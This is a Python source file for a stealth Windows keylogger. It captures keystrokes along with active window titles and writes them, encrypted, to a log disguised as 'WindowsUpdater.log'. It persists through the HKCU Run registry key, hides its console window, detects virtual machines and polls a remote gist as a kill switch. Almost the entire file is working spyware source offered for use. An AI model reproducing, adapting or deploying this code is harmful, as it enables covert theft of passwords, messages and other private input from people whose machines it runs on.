import os
import datetime
import platform
import ctypes
import sys
import wmi
import requests 
import win32console
import win32gui
from pynput import keyboard
from cryptography.fernet import Fernet
from winreg import CloseKey ,OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ

log_file = os.path.join(os.getenv('APPDATA'),
"WindowsUpdater.log")

# Encryption setup
with open("encryption.key", "rb") as key_file:
    key = key_file.read()
fernet = Fernet(key)

# Function to check kill-switch
def check_kill_switch():
    try:
        r = requests.get("https://gist.githubusercontent.com/RMXHM/fddec5ef289865581eba6c38b8800246/raw/d1ebea9f92bb3fc5577f7a0e60863f2c2191882d/kill_switch.txt", timeout=5)
        if r.text.strip().lower() == "stop":
            return True
    except:
        return False
    return False

# Function to add keylogger to startup
def add_to_startup():
    try:
        path = os.path.realpath(sys.argv[0])  # Get the path of the script
        key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_SET_VALUE)
        SetValueEx(key, "MyKeylogger", 0, REG_SZ, path)  # Add the keylogger path to startup registry
        CloseKey(key)
    except Exception as e:
        pass  # You can log the error here if you want

# Function to hide console window (stealth mode)
def hide_console():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)  # 0 = SW_HIDE
        ctypes.windll.kernel32.CloseHandle(whnd)

# Function to get the active window title (for logging purposes)
def get_active_window_title():
    if platform.system() != "Windows":
        return "N/A"
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
    return buff.value

# Function to check if the system is a virtual machine
def is_vm():
    try:
        c = wmi.WMI()
        for item in c.Win32_ComputerSystem():
            manufacturer = item.Manufacturer.lower()
            model = item.Model.lower()
            if "virtual" in manufacturer or "vmware" in manufacturer or "virtual" in model or "vmware" in model:
                return True
    except:
        return False
    return False  

# --- Buffers for better logging ---
buffer = ""
current_window = ""

# Function to flush the log buffer
def flush_buffer():
    global buffer, current_window
    if buffer.strip():
        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        log_entry = f"{timestamp} ({current_window}): {buffer}\n"
        encrypted_entry = fernet.encrypt(log_entry.encode())
        with open(log_file, "ab") as f:
            f.write(encrypted_entry + b"\n")
    buffer = ""

# Function to handle key presses
def on_press(key):
    global buffer, current_window
    try:
        new_window = get_active_window_title()
        if new_window != current_window:
            flush_buffer()
            current_window = new_window

        if hasattr(key, 'char') and key.char is not None:
            buffer += key.char
        elif key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            flush_buffer()
        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]
    except Exception:
        pass

# Function to stop keylogger on ESC key press
def on_release(key):
    if key == keyboard.Key.esc:
        flush_buffer()
        return False

# Function to log the system's VM status
def log_vm_status():
    if is_vm():
        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{timestamp} (SYSTEM): Running inside a VM or Virtual Environment\n")

# Main execution
if __name__ == "__main__":
    # Add to startup and hide console window for stealth
    add_to_startup()  # This ensures your script runs on startup
    hide_console()    # This hides the console window

    log_vm_status()   # Log if running in a VM

    # Start the keylogger and check kill-switch periodically
    from threading import Thread
    import time

    kill_switch_triggered = False

    def kill_switch_monitor():
        global kill_switch_triggered
        while True:
            if check_kill_switch():
                kill_switch_triggered = True
                break
            time.sleep(60)  # Check kill switch every 60 seconds

    monitor_thread = Thread(target=kill_switch_monitor, daemon=True)
    monitor_thread.start()

    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            while not kill_switch_triggered:
                time.sleep(1)
            listener.stop()  # Stop listener if kill-switch is triggered
    except Exception as e:
        with open("error.log", "a") as f:
            f.write(f"Error: {e}\n")   
            listener.stop()
    except Exception as e:
        with open("error.log", "a") as f:
            f.write(f"Error: {e}\n")
